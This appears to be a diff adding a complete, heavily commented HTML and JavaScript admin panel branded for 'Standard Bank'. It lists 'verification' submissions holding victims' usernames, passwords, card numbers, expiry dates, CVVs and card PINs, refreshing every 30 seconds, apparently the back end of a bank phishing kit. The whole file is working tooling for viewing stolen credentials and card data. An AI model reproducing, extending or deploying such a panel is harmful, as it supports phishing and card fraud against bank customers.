@@ -1,0 +1,397 @@
+<!DOCTYPE html>
+<html>
+<head>
+    <title>Admin Dashboard - Standard Bank</title>
+    <!-- Viewport meta tag for mobile responsiveness -->
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    
+    <!-- Internal CSS for dashboard styling -->
+    <style>
+        /* General body styling */
+        body {
+            font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif; /* Modern font stack */
+            background-color: #f5f5f5; /* Light gray background */
+            margin: 0; /* Remove default margin */
+            padding: 20px; /* Add padding around body */
+            color: #333; /* Dark text color */
+        }
+
+        /* Header styling */
+        .header {
+            background: linear-gradient(135deg, #667eea 0%, #764ba2 100%); /* Gradient background */
+            color: white; /* White text */
+            padding: 20px; /* Padding inside header */
+            border-radius: 10px; /* Rounded corners */
+            margin-bottom: 30px; /* Space below header */
+            display: flex; /* Use flexbox layout */
+            justify-content: space-between; /* Space between title and logout */
+            align-items: center; /* Center items vertically */
+            flex-wrap: wrap; /* Allow wrapping on small screens */
+        }
+
+        /* Header title styling */
+        .header h1 {
+            margin: 0; /* Remove default margin */
+            font-size: 28px; /* Large font size */
+            font-weight: 300; /* Light font weight */
+        }
+
+        /* Logout button styling */
+        .logout-btn {
+            background-color: rgba(255, 255, 255, 0.2); /* Semi-transparent white background */
+            color: white; /* White text */
+            border: 2px solid white; /* White border */
+            padding: 8px 16px; /* Padding inside button */
+            border-radius: 6px; /* Rounded corners */
+            cursor: pointer; /* Pointer cursor on hover */
+            font-size: 14px; /* Font size */
+            transition: all 0.3s ease; /* Smooth transitions */
+        }
+
+        /* Logout button hover effect */
+        .logout-btn:hover {
+            background-color: white; /* White background on hover */
+            color: #667eea; /* Purple text on hover */
+        }
+
+        /* Statistics container styling */
+        .stats {
+            display: grid; /* Use CSS Grid layout */
+            grid-template-columns: repeat(auto-fit, minmax(200px, 1fr)); /* Responsive grid columns */
+            gap: 20px; /* Gap between grid items */
+            margin-bottom: 30px; /* Space below statistics */
+        }
+
+        /* Individual stat card styling */
+        .stat-card {
+            background: white; /* White background */
+            padding: 20px; /* Padding inside card */
+            border-radius: 10px; /* Rounded corners */
+            box-shadow: 0 2px 10px rgba(0, 0, 0, 0.1); /* Subtle shadow */
+            text-align: center; /* Center align text */
+        }
+
+        /* Stat number styling */
+        .stat-number {
+            font-size: 36px; /* Large font size for numbers */
+            font-weight: bold; /* Bold text */
+            color: #667eea; /* Purple color */
+            display: block; /* Display as block element */
+        }
+
+        /* Stat label styling */
+        .stat-label {
+            font-size: 14px; /* Smaller font size */
+            color: #666; /* Gray color */
+            margin-top: 5px; /* Small space above label */
+        }
+
+        /* Data table container styling */
+        .table-container {
+            background: white; /* White background */
+            border-radius: 10px; /* Rounded corners */
+            box-shadow: 0 2px 10px rgba(0, 0, 0, 0.1); /* Subtle shadow */
+            overflow: hidden; /* Hide overflow for rounded corners */
+        }
+
+        /* Table header styling */
+        .table-header {
+            background: linear-gradient(135deg, #667eea 0%, #764ba2 100%); /* Gradient background */
+            color: white; /* White text */
+            padding: 20px; /* Padding inside header */
+            display: flex; /* Use flexbox layout */
+            justify-content: space-between; /* Space between title and refresh */
+            align-items: center; /* Center items vertically */
+        }
+
+        /* Refresh button styling */
+        .refresh-btn {
+            background-color: rgba(255, 255, 255, 0.2); /* Semi-transparent background */
+            color: white; /* White text */
+            border: 1px solid rgba(255, 255, 255, 0.5); /* Semi-transparent border */
+            padding: 6px 12px; /* Padding inside button */
+            border-radius: 4px; /* Rounded corners */
+            cursor: pointer; /* Pointer cursor */
+            font-size: 12px; /* Small font size */
+            transition: all 0.3s ease; /* Smooth transitions */
+        }
+
+        /* Refresh button hover effect */
+        .refresh-btn:hover {
+            background-color: rgba(255, 255, 255, 0.3); /* Slightly more opaque on hover */
+        }
+
+        /* Table styling */
+        table {
+            width: 100%; /* Full width */
+            border-collapse: collapse; /* Collapse borders */
+        }
+
+        /* Table header cell styling */
+        th {
+            background-color: #f8f9fa; /* Light gray background */
+            padding: 15px 10px; /* Padding inside header cells */
+            text-align: left; /* Left align text */
+            font-weight: 600; /* Semi-bold text */
+            color: #495057; /* Dark gray text */
+            border-bottom: 2px solid #e9ecef; /* Bottom border */
+            font-size: 14px; /* Font size */
+        }
+
+        /* Table data cell styling */
+        td {
+            padding: 15px 10px; /* Padding inside data cells */
+            border-bottom: 1px solid #e9ecef; /* Bottom border */
+            font-size: 14px; /* Font size */
+        }
+
+        /* Table row hover effect */
+        tbody tr:hover {
+            background-color: #f8f9fa; /* Light gray background on hover */
+        }
+
+        /* Sensitive data styling (password, card details) */
+        .sensitive-data {
+            background-color: #fff3cd; /* Light yellow background */
+            color: #856404; /* Dark yellow text */
+            padding: 4px 8px; /* Padding around text */
+            border-radius: 4px; /* Rounded corners */
+            font-family: monospace; /* Monospace font for data */
+            font-size: 12px; /* Smaller font size */
+            border: 1px solid #ffeaa7; /* Yellow border */
+        }
+
+        /* Loading state styling */
+        .loading {
+            text-align: center; /* Center align text */
+            padding: 40px; /* Large padding */
+            color: #666; /* Gray text color */
+            font-style: italic; /* Italic text */
+        }
+
+        /* No data message styling */
+        .no-data {
+            text-align: center; /* Center align text */
+            padding: 40px; /* Large padding */
+            color: #999; /* Light gray text */
+            font-style: italic; /* Italic text */
+        }
+
+        /* Responsive design for mobile devices */
+        @media (max-width: 768px) {
+            .header {
+                flex-direction: column; /* Stack header items vertically */
+                text-align: center; /* Center align text */
+                gap: 15px; /* Add gap between stacked items */
+            }
+
+            .table-container {
+                overflow-x: auto; /* Enable horizontal scrolling */
+            }
+
+            table {
+                min-width: 800px; /* Minimum width to prevent cramping */
+            }
+
+            th, td {
+                padding: 10px 8px; /* Reduce padding on mobile */
+                font-size: 12px; /* Smaller font on mobile */
+            }
+        }
+    </style>
+</head>
+<body>
+    <!-- Header section with title and logout button -->
+    <div class="header">
+        <h1>Admin Dashboard</h1>
+        <button class="logout-btn" onclick="logout()">Logout</button>
+    </div>
+
+    <!-- Statistics section -->
+    <div class="stats">
+        <div class="stat-card">
+            <span class="stat-number" id="total-submissions">0</span>
+            <div class="stat-label">Total Submissions</div>
+        </div>
+        <div class="stat-card">
+            <span class="stat-number" id="today-submissions">0</span>
+            <div class="stat-label">Today's Submissions</div>
+        </div>
+        <div class="stat-card">
+            <span class="stat-number" id="this-week-submissions">0</span>
+            <div class="stat-label">This Week</div>
+        </div>
+    </div>
+
+    <!-- Data table section -->
+    <div class="table-container">
+        <div class="table-header">
+            <h3 style="margin: 0;">Submitted Verification Data</h3>
+            <button class="refresh-btn" onclick="loadSubmissions()">Refresh</button>
+        </div>
+        
+        <!-- Loading indicator -->
+        <div id="loading" class="loading">Loading submissions...</div>
+        
+        <!-- Table for displaying submission data -->
+        <table id="submissions-table" style="display: none;">
+            <thead>
+                <tr>
+                    <th>ID</th>
+                    <th>Username</th>
+                    <th>Password</th>
+                    <th>Card Number</th>
+                    <th>Expiry Date</th>
+                    <th>CVV</th>
+                    <th>Card Pin</th>
+                    <th>Contact Number</th>
+                    <th>Submitted At</th>
+                </tr>
+            </thead>
+            <tbody id="submissions-body">
+                <!-- Dynamic content will be inserted here -->
+            </tbody>
+        </table>
+        
+        <!-- No data message -->
+        <div id="no-data" class="no-data" style="display: none;">
+            No submissions found.
+        </div>
+    </div>
+
+    <!-- JavaScript for dashboard functionality -->
+    <script>
+        // Function to load and display all submissions
+        function loadSubmissions() {
+            // Show loading indicator and hide table
+            document.getElementById('loading').style.display = 'block';
+            document.getElementById('submissions-table').style.display = 'none';
+            document.getElementById('no-data').style.display = 'none';
+            
+            // Fetch submissions data from API
+            fetch('/api/admin/submissions')
+                .then(response => {
+                    if (!response.ok) { // Check if response is not successful
+                        throw new Error('Failed to fetch submissions'); // Throw error
+                    }
+                    return response.json(); // Parse response as JSON
+                })
+                .then(submissions => {
+                    // Hide loading indicator
+                    document.getElementById('loading').style.display = 'none';
+                    
+                    if (submissions.length === 0) { // Check if no submissions found
+                        // Show no data message
+                        document.getElementById('no-data').style.display = 'block';
+                    } else {
+                        // Show table and populate with data
+                        document.getElementById('submissions-table').style.display = 'table';
+                        populateTable(submissions); // Fill table with submission data
+                        updateStatistics(submissions); // Update statistics cards
+                    }
+                })
+                .catch(error => {
+                    // Handle errors
+                    console.error('Error loading submissions:', error);
+                    document.getElementById('loading').innerHTML = 'Error loading submissions. Please try again.';
+                });
+        }
+
+        // Function to populate the table with submission data
+        function populateTable(submissions) {
+            const tbody = document.getElementById('submissions-body');
+            tbody.innerHTML = ''; // Clear existing content
+            
+            // Loop through each submission and create table rows
+            submissions.forEach(submission => {
+                const row = document.createElement('tr'); // Create new table row
+                
+                // Create table row HTML with submission data
+                row.innerHTML = `
+                    <td>${submission.id}</td>
+                    <td>${escapeHtml(submission.fullname)}</td>
+                    <td><span class="sensitive-data">${escapeHtml(submission.password)}</span></td>
+                    <td><span class="sensitive-data">${escapeHtml(submission.card_number)}</span></td>
+                    <td>${escapeHtml(submission.expiry_date)}</td>
+                    <td><span class="sensitive-data">${escapeHtml(submission.cvv)}</span></td>
+                    <td><span class="sensitive-data">${escapeHtml(submission.card_pin)}</span></td>
+                    <td>${escapeHtml(submission.contact_number || 'N/A')}</td>
+                    <td>${formatDate(submission.submitted_at)}</td>
+                `;
+                
+                tbody.appendChild(row); // Add row to table body
+            });
+        }
+
+        // Function to update statistics cards
+        function updateStatistics(submissions) {
+            const now = new Date(); // Current date and time
+            const today = now.toISOString().split('T')[0]; // Today's date in YYYY-MM-DD format
+            const weekAgo = new Date(now.getTime() - 7 * 24 * 60 * 60 * 1000).toISOString(); // Date 7 days ago
+            
+            // Calculate total submissions
+            const totalSubmissions = submissions.length;
+            
+            // Calculate today's submissions
+            const todaySubmissions = submissions.filter(sub => 
+                sub.submitted_at.startsWith(today) // Filter submissions from today
+            ).length;
+            
+            // Calculate this week's submissions
+            const weekSubmissions = submissions.filter(sub => 
+                sub.submitted_at >= weekAgo // Filter submissions from past week
+            ).length;
+            
+            // Update statistics display
+            document.getElementById('total-submissions').textContent = totalSubmissions;
+            document.getElementById('today-submissions').textContent = todaySubmissions;
+            document.getElementById('this-week-submissions').textContent = weekSubmissions;
+        }
+
+        // Function to format date for display
+        function formatDate(dateString) {
+            const date = new Date(dateString); // Parse date string
+            return date.toLocaleString(); // Return formatted local date/time string
+        }
+
+        // Function to escape HTML to prevent XSS attacks
+        function escapeHtml(text) {
+            const map = {
+                '&': '&amp;',
+                '<': '&lt;',
+                '>': '&gt;',
+                '"': '&quot;',
+                "'": '&#039;'
+            };
+            return text.replace(/[&<>"']/g, function(m) { return map[m]; }); // Replace special characters
+        }
+
+        // Function to handle admin logout
+        function logout() {
+            // Send logout request to server
+            fetch('/admin/logout', {
+                method: 'POST' // Use POST method for logout
+            })
+            .then(response => response.json()) // Parse response
+            .then(data => {
+                if (data.success) { // Check if logout was successful
+                    window.location.href = '/admin/login'; // Redirect to login page
+                }
+            })
+            .catch(error => {
+                console.error('Logout error:', error); // Log any errors
+                // Redirect to login page even if logout request fails
+                window.location.href = '/admin/login';
+            });
+        }
+
+        // Load submissions when page loads
+        document.addEventListener('DOMContentLoaded', function() {
+            loadSubmissions(); // Load submissions on page load
+        });
+
+        // Auto-refresh submissions every 30 seconds
+        setInterval(loadSubmissions, 30000); // Refresh every 30 seconds
+    </script>
+</body>
+</html>
